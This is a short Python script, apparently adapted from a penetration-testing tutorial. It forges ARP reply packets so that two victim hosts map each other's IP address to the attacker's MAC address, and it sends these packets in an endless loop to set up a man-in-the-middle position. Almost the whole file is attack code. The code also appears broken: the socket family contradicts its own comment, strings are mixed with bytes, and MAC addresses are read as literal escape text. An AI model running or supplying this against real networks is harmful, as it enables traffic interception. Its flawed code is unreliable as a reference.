# ARP Spoofing Program
# Written by Ray Loerke
# Adapted from https://www.tutorialspoint.com/python_penetration_testing/python_penetration_testing_arp_spoofing.htm

import socket

# Not sure if these are necessary?
# import struct
# import binascii

# The first parameter determines the packet interface. Use PF_PACKET for Linux and AF_INET for Windows
# The third parameter determines the protocol we want to use. 0x0800 is IP
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.htons(0x0800))

# '' is set as the address to indicate we should listen to requests coming from anyone
s.bind(('', socket.htons(0x0800)))

# MAC addresses of involved machines
# Formatting example: '\x00\x0c\x29\x4f\x8e\76'
attackmac = input("Enter the Attacker's MAC address: ")
victim1mac = input("Enter Victim 1's MAC address: ")
victim2mac = input("Enter Victim 2's MAC address: ")


# This code identifies that we are using ARP protocol
code = '\x08\x06'

# Ethernet packets are built for each target using MAC addresses and the ARP code
ethernet1 = victim1mac + attackmac + code
ethernet2 = victim2mac + attackmac + code

# Then the ARP headers are crafted
htype = '\x00\x01'  # Hardware type: Ethernet is 0x0001
prototype = '\x08\x00'  # Protocol type: IPv4 is 0x0800
hsize = '\x06'  # Hardware length: Ethernet address length is 0x06 octets for the 48 bit MAC address
psize = '\x04'  # Protocol length: IPv4 is 0x04
opcode = '\x00\x02'  # Operation code: is this a REQUEST (0x0001) or REPLY (0x0002)

# IP addresses of involved machines
# Formatting example: '192.168.43.85'
victim1_ip = input("Enter Victim 1's IP address: ")
victim2_ip = input("Enter Victim 2's IP address: ")

# Convert IP addresses into Hex
victim1ip = socket.inet_aton(victim1_ip)
victim2ip = socket.inet_aton(victim2_ip)

# The full ARP packets are put together
# First we have the Ethernet header, then the ARP header fields, then the sender hardware address,
# false sender IP address, target hardware address, and target IP address
victim1_ARP = ethernet1 + htype + prototype + hsize + psize + opcode + attackmac + victim2ip + victim1mac + victim1ip
victim2_ARP = ethernet2 + htype + prototype + hsize + psize + opcode + attackmac + victim1ip + victim2mac + victim2ip

# Continuously send the forged ARP packets to the two targets
while 1:
    s.sendto(victim1_ARP, ('', socket.htons(0x0800)))
    s.sendto(victim2_ARP, ('', socket.htons(0x0800)))

